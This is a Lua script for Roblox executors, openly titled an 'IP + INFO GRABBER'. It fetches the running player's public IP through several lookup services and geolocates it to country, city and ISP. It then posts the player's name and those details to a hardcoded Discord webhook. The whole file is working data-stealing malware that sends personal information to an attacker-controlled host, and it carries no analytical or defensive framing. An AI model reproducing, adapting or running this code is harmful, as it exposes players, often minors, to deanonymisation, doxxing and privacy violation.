-- === DELTA COMPATIBLE IP + INFO GRABBER ===
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local name = player.Name

-- Use correct HTTP function for Delta
local request = (syn and syn.request) or (http and http.request) or request or nil

if not request then
    warn("No HTTP function available!")
    return
end

-- === STEP 1: GET IP (WITH MULTIPLE FALLBACKS) ===
local ip = nil
local ipServices = {
    "https://api.ipify.org?format=json",
    "https://ipinfo.io/json",
    "https://ifconfig.me/ip",
    "http://icanhazip.com",
    "https://myexternalip.com/json"
}

for _, url in ipairs(ipServices) do
    local success, response = pcall(function()
        return request({
            Url = url,
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Roblox"
            }
        })
    end)

    if success and response and response.Body then
        local body = response.Body:gsub("%s+", "") -- clean

        if url:find("json") then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, body)
            if ok and data.ip then
                ip = data.ip
                break
            elseif ok and data.query then
                ip = data.query
                break
            end
        else
            if body:match("^%d+%.%d+%.%d+%.%d+$") then
                ip = body
                break
            end
        end
    end
    wait(0.5)
end

if not ip then
    warn("All IP services failed!")
    return
end

print("Got IP:", ip)

-- === STEP 2: GET IP INFO ===
local info = {}
local success2, response2 = pcall(function()
    return request({
        Url = "http://ip-api.com/json/" .. ip,
        Method = "GET"
    })
end)

if success2 and response2 and response2.Success then
    local ok, data = pcall(HttpService.JSONDecode, HttpService, response2.Body)
    if ok then
        info = data
    end
end

-- === STEP 3: FORMAT & SEND TO DISCORD ===
local webhook = "https://discord.com/api/webhooks/1048338938340843550/2ZNKB3rbE4U5VVqNgLKxQAHVuskDn3I1ySzfy0Z_ngzXNrenblomXbilhEhjNIIqYMrc"

local message = string.format(
    "**%s**\n**IP:** `%s`\n**Country:** %s (%s)\n**City:** %s\n**ISP:** %s\n**Org:** %s",
    name,
    ip,
    info.country or "Unknown",
    info.countryCode or "??",
    info.city or "Unknown",
    info.isp or "Unknown",
    info.org or "Unknown"
)

local payload = { content = message }

local ok, result = pcall(function()
    return request({
        Url = webhook,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(payload)
    })
end)

if ok and result and (result.StatusCode == 200 or result.StatusCode == 204) then
    print("Successfully sent to Discord!")
else
    warn("Webhook failed:", result and result.StatusCode or "No response")
end
